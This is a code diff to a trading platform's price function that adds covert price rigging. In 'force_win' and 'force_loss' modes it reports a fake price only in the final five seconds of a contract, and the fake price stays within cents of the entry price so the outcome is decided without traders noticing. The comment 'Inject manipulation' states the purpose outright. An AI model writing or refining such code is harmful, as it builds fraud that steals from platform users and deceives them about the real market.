@@ -438,21 +438,33 @@ function getContractCurrentPrice(contract) {
     return realPrice;
   }
 
+  // Inject manipulation only in the last 5 seconds of the trade
+  if (contract.remaining_seconds > 5) {
+    return realPrice;
+  }
+
   const entry = parseFloat(contract.entry_price);
-  const delta = Math.max(entry * 0.005, 10.0);
-  const noise = (Math.random() * (entry * 0.0005));
+  
+  // Maintain within a few cents of the entry price
+  let delta = 0.05;
+  let noise = Math.random() * 0.04;
+  
+  if (entry < 1) {
+    delta = entry * 0.005;
+    noise = delta * Math.random();
+  }
 
   if (mode === 'force_win') {
     if (contract.direction === 'higher') {
-      return parseFloat((entry + delta + noise).toFixed(2));
+      return parseFloat((entry + delta + noise).toFixed(6));
     } else {
-      return parseFloat((entry - delta - noise).toFixed(2));
+      return parseFloat((entry - delta - noise).toFixed(6));
     }
   } else if (mode === 'force_loss') {
     if (contract.direction === 'higher') {
-      return parseFloat((entry - delta - noise).toFixed(2));
+      return parseFloat((entry - delta - noise).toFixed(6));
     } else {
-      return parseFloat((entry + delta + noise).toFixed(2));
+      return parseFloat((entry + delta + noise).toFixed(6));
     }
   }
 
